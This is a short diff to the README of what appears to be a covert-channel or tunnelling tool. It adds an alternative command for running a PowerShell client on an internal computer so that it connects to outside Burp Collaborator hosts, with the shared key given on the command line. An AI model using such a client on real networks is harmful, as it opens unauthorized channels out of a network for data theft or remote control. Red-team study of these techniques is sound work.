@@ -15,5 +15,10 @@ sh > python3 bi-server.py <BURPCOLLABORATOR-HOSTNAME-1> <BIID-2> S3cr3tK3y
 5. Execute the client powershell script on the internal computer.
 
 ```
+PS > .\bi-client.ps1 <BURPCOLLABORATOR-HOSTNAME-2> <BIID-1> S3cr3tK3y
+```
+or
+```
 PS > .\bi-client.ps1 <BURPCOLLABORATOR-HOSTNAME-2> <BIID-1>
 Enter Key: S3cr3tK3y
+```
